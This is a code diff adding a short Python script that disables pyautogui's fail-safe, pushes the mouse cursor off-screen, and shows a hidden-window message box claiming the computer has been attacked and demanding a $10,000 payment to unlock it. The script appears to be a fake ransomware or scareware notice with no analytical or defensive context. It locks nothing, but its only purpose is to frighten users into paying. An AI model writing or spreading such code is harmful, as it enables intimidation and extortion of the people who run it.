@@ -1,0 +1,25 @@
+import tkinter as tk
+from tkinter import messagebox
+import pyautogui
+pyautogui.FAILSAFE = False
+
+ 
+# Get the screen size
+screen_width, screen_height = pyautogui.size()
+ 
+# Move the cursor to an extreme position (not recommended for actual use)
+pyautogui.moveTo(screen_width + 10, screen_height + 10, duration=1)  # Adjusted duration
+ 
+# Function to show the message
+def show_message():
+    messagebox.showinfo("Warning", "You have been attacked. A payment of $10,000 is required to unlock this computer")
+ 
+# Create the main window
+root = tk.Tk()
+root.withdraw()  # Hide the main window
+ 
+# Call the function to show the message
+show_message()
+ 
+# Run the main loop
+root.mainloop()
